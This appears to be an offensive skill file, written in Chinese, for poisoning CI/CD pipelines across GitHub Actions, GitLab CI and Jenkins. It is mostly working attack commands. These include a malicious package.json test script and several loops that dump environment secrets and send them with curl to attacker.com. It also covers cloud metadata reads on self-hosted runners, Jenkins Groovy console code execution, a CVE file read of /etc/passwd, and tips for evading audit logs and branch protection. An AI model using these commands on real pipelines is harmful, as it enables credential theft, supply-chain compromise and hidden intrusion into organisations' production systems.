---
name: cicd-pipeline-poisoning
description: CI/CD基础设施滥用与流水线投毒 — GitHub Actions/GitLab CI/Jenkins利用 + 自托管Runner滥用 + Secret转储
tags: [cicd, devops, github-actions, pipeline, supply-chain, cloud]
---

# CI/CD 基础设施滥用与流水线投毒

## 核心原理

审计 CI/CD 工作流配置，识别缺乏分支保护、自动化审批逻辑漏洞或过度权限的流水线。通过合法的部署管道实现任意代码执行、凭证窃取和生产环境横向移动。

## 触发条件

- 目标资产包含云原生架构、代码托管平台或 DevOps 基础设施
- 需要从 Web 应用渗透转向基础设施层攻击
- 发现目标使用 GitHub Actions / GitLab CI / Jenkins / CircleCI
- 目标有自托管 Runner (Self-hosted Runner)

## 一、GitHub Actions 攻击面

### 1.1 工作流文件审计

```bash
# 克隆目标仓库
git clone https://github.com/TARGET_ORG/REPO.git
cd REPO

# 查找所有工作流文件
find .github/workflows/ -name "*.yml" -o -name "*.yaml"

# 审计关键风险点:
grep -rn "pull_request_target" .github/workflows/  # 高危! 可执行任意代码
grep -rn "workflow_dispatch" .github/workflows/     # 手动触发
grep -rn "schedule:" .github/workflows/             # 定时触发
grep -rn "secrets\." .github/workflows/             # 引用密钥
grep -rn "actions/checkout" .github/workflows/      # 检出代码
grep -rn "run:" .github/workflows/                  # 执行命令
```

### 1.2 pull_request_target 投毒 (高危)

```yaml
# 漏洞工作流示例 (易受攻击):
name: PR Check
on:
  pull_request_target:  # 危险! 在 PR 时以目标仓库权限执行
    types: [opened, synchronize]
jobs:
  check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # 检出 PR 代码!
      - run: npm install && npm test  # 执行 PR 中的代码!
```

**攻击方式**:
1. Fork 目标仓库
2. 在 Fork 中修改 `package.json` 的 `scripts.test` 为恶意命令
3. 提交 PR → 工作流以目标仓库权限执行恶意代码
4. 可访问所有 Repository Secrets (生产凭证)

**恶意 PR payload 示例** (package.json):
```json
{
  "scripts": {
    "test": "curl https://attacker.com/exfil -d \"$(env | base64)\""
  }
}
```

### 1.3 Secret 转储攻击

```bash
# 方式1: 直接环境变量泄露 (通过 PR 触发)
# 在恶意 build step 中:
env | grep -iE "AWS_|DOCKER_|API_|TOKEN_|SECRET_|KEY_|PASSWORD_" | base64
curl -d "$ENCODED_ENV" https://attacker.com/exfil

# 方式2: 通过 GitHub API 获取已配置的 Secret 名称
# (不能获取值，但可以知道有哪些 Secret)
gh secret list -R ORG/REPO

# 方式3: 利用 Actions 日志泄露
# 如果工作流中有 echo $SECRET 或 set -x，Secret 可能出现在日志中
gh run view <RUN_ID> -R ORG/REPO --log | grep -iE "AKIA|token|password|secret"
```

### 1.4 自托管 Runner 滥用

```bash
# 识别自托管 Runner:
# 1. 工作流中 runs-on 不是 ubuntu-latest/windows-latest
grep -rn "runs-on:" .github/workflows/ | grep -v "latest"
# 示例: runs-on: [self-hosted, linux, production]

# 2. 通过 API 枚举 Runner
gh api repos/ORG/REPO/actions/runners | jq '.runners[] | {name, os, status}'

# 自托管 Runner 攻击:
# Runner 通常在内网中运行，具有:
# - 内网访问权限
# - 可能挂载 Docker socket
# - 可能有持久化存储
# - 可能有更高的 IAM 权限

# 恶意 workflow 在自托管 Runner 上执行:
# 1. 扫描内网: nmap 10.0.0.0/8
# 2. 读取 Runner 元数据: curl http://169.254.169.254/latest/meta-data/
# 3. 挂载 Docker socket: ls -la /var/run/docker.sock
# 4. 读取 Runner 配置: cat /etc/runner/config
```

### 1.5 GitHub Actions 常见漏洞模式

| 模式 | 风险 | 检测 |
|------|------|------|
| `pull_request_target` + checkout PR | **严重** | `grep -r "pull_request_target" .github/` |
| `workflow_dispatch` 无审批 | 高 | 手动触发可执行任意代码 |
| Secret 在 `run:` 中直接使用 | 中 | 日志可能泄露 |
| 使用第三方 Action 无固定版本 | 中 | `uses: action@main` 而非 `@sha256:...` |
| GITHUB_TOKEN 权限过宽 | 中 | `permissions: write-all` |
| Cache poisoning | 中 | 修改缓存内容注入恶意代码 |

## 二、GitLab CI 攻击面

### 2.1 .gitlab-ci.yml 审计

```bash
# 查找 CI 配置
cat .gitlab-ci.yml
find . -name ".gitlab-ci.yml" -o -name "*.gitlab-ci.yml"

# 关键风险点
grep -n "script:" .gitlab-ci.yml          # 执行的命令
grep -n "variables:" .gitlab-ci.yml       # 变量定义
grep -n "services:" .gitlab-ci.yml        # 旁挂服务
grep -n "only:" .gitlab-ci.yml            # 触发条件
grep -n "tags:" .gitlab-ci.yml            # Runner 标签
```

### 2.2 GitLab CI 关键攻击向量

```yaml
# 漏洞1: 无保护的变量 (所有分支可访问)
variables:
  PROD_DB_PASSWORD: "xxx"  # 或在 GitLab 设置中配置但未限制环境

# 漏洞2: MR (Merge Request) 触发执行
# 攻击者 Fork → 提交恶意 .gitlab-ci.yml → MR 触发执行

# 漏洞3: include 外部配置
include:
  - project: 'some/external-project'
    file: '.gitlab-ci.yml'  # 外部项目被控制后可投毒

# 漏洞4: 缓存投毒
cache:
  key: "${CI_COMMIT_REF_SLUG}"  # 分支名做 key，可投毒
  paths:
    - node_modules/
```

## 三、Jenkins 攻击面

### 3.1 Jenkins 信息收集

```bash
# Jenkins 默认端口: 8080
curl -s http://target:8080/ | head -20
curl -s http://target:8080/api/json?pretty=true
curl -s http://target:8080/manage          # 管理页面
curl -s http://target:8080/script          # Groovy 控制台 (需认证)

# 枚举 Job
curl -s http://target:8080/api/json?tree=jobs[name,url,color] | jq .

# 枚举用户
curl -s http://target:8080/asynchPeople/ | grep -oP 'user/[^"]+'

# 检查匿名访问
curl -s http://target:8080/job/test/config.xml | head -5
```

### 3.2 Jenkins 漏洞利用

```bash
# 1. Groovy Script Console RCE (需管理员访问)
# http://target:8080/script
def proc = "id".execute()
println proc.text

# 2. 构建日志中的凭证泄露
curl -s http://target:8080/job/JOB_NAME/1/consoleText | grep -iE "password|token|key|secret"

# 3. Jenkins 文件 (Jenkinsfile) 审计
cat Jenkinsfile | grep -iE "credentials|withCredentials|environment"

# 4. CVE-2024-23897 (任意文件读取)
# Jenkins CLI args4j 解析漏洞
java -jar jenkins-cli.jar -s http://target:8080/ help "@/etc/passwd"
```

## 四、通用 CI/CD 攻击模式

### 4.1 环境变量/Secret 枚举

```bash
# CI/CD 环境中常见的高价值变量
VARS=(
  "AWS_ACCESS_KEY_ID" "AWS_SECRET_ACCESS_KEY" "AWS_SESSION_TOKEN"
  "DOCKER_USERNAME" "DOCKER_PASSWORD" "DOCKER_REGISTRY"
  "GITHUB_TOKEN" "GITLAB_TOKEN" "NPM_TOKEN"
  "DATABASE_URL" "DB_PASSWORD" "REDIS_URL"
  "API_KEY" "SECRET_KEY" "JWT_SECRET"
  "SLACK_TOKEN" "SENTRY_DSN" "NEW_RELIC_LICENSE_KEY"
)

# 在 CI 脚本中注入检测:
for var in "${VARS[@]}"; do
  echo "$var=${!var}" 2>/dev/null
done | base64 | curl -d @- https://attacker.com/exfil
```

### 4.2 依赖投毒 (Dependency Confusion)

```bash
# 原理: 企业内部包名未在公共注册表占位
# 攻击者在 npm/PyPI 发布同名高版本包
# CI/CD 安装时自动拉取恶意包

# 检测内部包名:
cat package.json | jq '.dependencies | keys'  # npm
cat requirements.txt | awk -F'==' '{print $1}' # pip
cat pom.xml | grep -oP '<artifactId>[^<]+'    # Maven

# 在公共注册表检查是否被占用:
npm view internal-package-name
pip index versions internal-package-name
```

### 4.3 缓存投毒 (Cache Poisoning)

```bash
# CI/CD 缓存通常基于分支名或 lock 文件 hash
# 如果缓存 key 可预测且缓存内容可被恶意修改:

# GitHub Actions 缓存投毒:
# 1. 创建与目标相同 cache key 的分支
# 2. 在缓存中注入恶意代码 (如 node_modules 中的 postinstall 脚本)
# 3. 目标分支使用被投毒的缓存

# 检测缓存 key 是否可预测:
grep -rn "cache" .github/workflows/ | grep -iE "key:|path:"
```

## 五、防御绕过技巧

```bash
# 1. CI 环境检测绕过
# 很多 CI/CD 有 IP 白名单或环境变量检测
# 绕过: 不修改 CI 环境变量，只修改构建产物

# 2. 分支保护绕过
# 如果需要直接推送到受保护分支:
# - 寻找没有保护的分支 (staging/dev)
# - 利用 Admin 权限绕过
# - 利用 "Allow force push" 配置错误

# 3. 审计日志规避
# GitHub: 使用匿名 API 或已泄露的 Token
# GitLab: 使用 Project Access Token 而非 Personal Token
```

## 六、工具链

| 工具 | 用途 | 安装 |
|------|------|------|
| gh CLI | GitHub API 操作 | `apt install gh` |
| glab CLI | GitLab API 操作 | `apt install glab` |
| trufflehog | Git 历史密钥扫描 | `pip install trufflehog` |
| gitleaks | Git 密钥泄露检测 | GitHub releases |
| semgrep | 语义代码扫描 | `pip install semgrep` |

## 参考

- GitHub Actions Security: https://docs.github.com/en/actions/security
- GitLab CI Security: https://docs.gitlab.com/ee/ci/secrets/
- Jenkins Security: https://www.jenkins.io/security/
- Confused Deputy: https://medium.com/tinder-engineering/exploiting-github-actions-on-open-source-projects
